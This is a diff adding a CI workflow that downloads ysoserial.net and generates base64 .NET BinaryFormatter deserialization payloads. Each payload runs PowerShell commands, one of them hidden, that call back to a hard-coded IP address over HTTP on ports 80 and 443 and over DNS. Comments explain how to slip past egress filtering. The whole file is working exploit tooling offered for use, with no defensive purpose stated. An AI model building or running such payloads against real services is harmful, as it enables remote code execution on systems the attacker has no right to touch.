@@ -1,0 +1,42 @@
+name: Generate multi-port payloads
+on: [push]
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - name: Download ysoserial.net
+        run: |
+          $url = "https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip"
+          Invoke-WebRequest $url -OutFile ysoserial.zip
+          Expand-Archive ysoserial.zip -DestinationPath yso
+      - name: Generate
+        run: |
+          $exe = Get-ChildItem -Recurse -Filter ysoserial.exe | Select-Object -First 1
+          $ip = "167.172.142.69"
+
+          # Port 80
+          & $exe.FullName -g DataSet -f BinaryFormatter `
+            -c "powershell -c `"(New-Object Net.WebClient).DownloadString('http://${ip}:80/pwned')`"" `
+            -o base64 | Out-File port80.b64 -Encoding ascii
+
+          # Port 443 (will fail TLS but we'll see the connection attempt)
+          & $exe.FullName -g DataSet -f BinaryFormatter `
+            -c "powershell -c `"(New-Object Net.WebClient).DownloadString('http://${ip}:443/pwned')`"" `
+            -o base64 | Out-File port443.b64 -Encoding ascii
+
+          # Port 53 DNS - almost always allowed
+          & $exe.FullName -g DataSet -f BinaryFormatter `
+            -c "powershell -c `"[System.Net.Dns]::GetHostEntry('pwned.${ip}.nip.io')`"" `
+            -o base64 | Out-File dns.b64 -Encoding ascii
+
+          # Try direct PowerShell without cmd wrapper
+          & $exe.FullName -g DataSet -f BinaryFormatter `
+            -c "powershell.exe -NoP -NonI -W Hidden -c `"iwr http://${ip}:80/pwned`"" `
+            -o base64 | Out-File iwr80.b64 -Encoding ascii
+
+          dir *.b64 | Select Name,Length
+      - name: Upload
+        uses: actions/upload-artifact@v4
+        with:
+          name: port-payloads
+          path: "*.b64"
